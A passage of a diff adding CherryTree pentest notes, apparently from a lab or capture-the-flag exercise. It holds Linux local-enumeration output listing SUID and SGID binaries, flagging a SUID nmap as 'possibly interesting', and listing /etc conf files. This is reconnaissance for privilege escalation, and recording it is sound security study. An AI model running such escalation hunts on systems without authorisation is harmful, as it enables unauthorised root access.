+-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
+-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
+-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
+-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
+
+
+[+] Possibly interesting SUID files:
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+
+
+[-] SGID files:
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-touchlock
+-rwxr-sr-x 1 root utmp 421768 Nov  7  2013 /usr/bin/screen
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-unlock
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-lock
+-rwxr-sr-x 1 root crontab 35984 Feb  9  2013 /usr/bin/crontab
+-rwxr-sr-x 1 root shadow 54968 Feb 17  2014 /usr/bin/chage
+-rwxr-sr-x 1 root shadow 23360 Feb 17  2014 /usr/bin/expiry
+-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root ssh 284784 May 12  2014 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 19024 Feb 12  2015 /usr/bin/wall
+-rwxr-sr-x 1 root shadow 35536 Jan 31  2014 /sbin/unix_chkpwd
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r-- 1 root root 604 Nov  7  2013 /etc/deluser.conf
+-rw-r--r-- 1 root root 703 Jan 22  2014 /etc/logrotate.conf
+-rw-r--r-- 1 root root 771 May 18  2013 /etc/insserv.conf
+-rw-r--r-- 1 root root 34 Jun 24  2015 /etc/ld.so.conf
+-rw-r--r-- 1 root root 2109 Sep 16  2015 /etc/sysctl.conf
+-rw-r--r-- 1 root root 2969 Feb 23  2014 /etc/debconf.conf
+-rw-r--r-- 1 root root 7773 Jun 24  2015 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 191 Dec  4  2013 /etc/libaudit.conf
+-rw-r--r-- 1 root root 956 Feb 19  2014 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 321 Apr 16  2014 /etc/blkid.conf
+-rw-r--r-- 1 root root 475 Feb 20  2014 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 1320 Aug 19  2014 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 2981 Jun 24  2015 /etc/adduser.conf
+-rw-r--r-- 1 root root 2584 Oct 10  2012 /etc/gai.conf
+-rw-r--r-- 1 root root 92 Feb 20  2014 /etc/host.conf
+-rw-r--r-- 1 root root 1260 Jul  1  2013 /etc/ucf.conf
+-rw-r--r-- 1 root root 111 Jun 24  2015 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 5790 Sep 16  2015 /etc/vsftpd.conf
+-rw-r--r-- 1 root root 552 Jan 31  2014 /etc/pam.conf
+
+
+[-] Any interesting mail in /var/mail:
+total 8
+drwxrwsr-x  2 root mail 4096 Jun 24  2015 .
+drwxr-xr-x 11 root root 4096 Jun 24  2015 ..
+
+
+### SCAN COMPLETE ####################################
+</rich_text>
+		</node>
+	</node>
+</cherrytree>
